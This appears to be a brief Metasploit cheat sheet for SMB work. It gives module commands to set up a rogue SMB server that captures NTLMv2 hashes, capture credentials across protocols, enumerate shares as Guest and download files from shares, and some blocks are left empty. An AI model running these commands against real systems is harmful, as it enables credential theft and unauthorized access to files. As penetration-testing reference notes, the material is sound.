# Start capturing NTLMv2 over SMB
```ruby
use auxiliary/server/capture/smb
set VERBOSE true
run
```

# Start capturing all supported protocols
```ruby
load capture
captureg start --ip <ip>
```

# Enumerate SMB shares
## Options
```ruby
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip>
set SMBUser Guest
set ShowFiles true
set SpiderShares true
```

## Run
```ruby
```

# Download a file over SMB
## Options
```ruby
use auxiliary/admin/smb/download_file
```

## Run
```ruby
use auxiliary/admin/smb/download_file
run smb://Guest:@<ip>/<share>/<path>/<file>
# run smb://<user>:<password>@<ip>/<share>/<path>/<file>
```
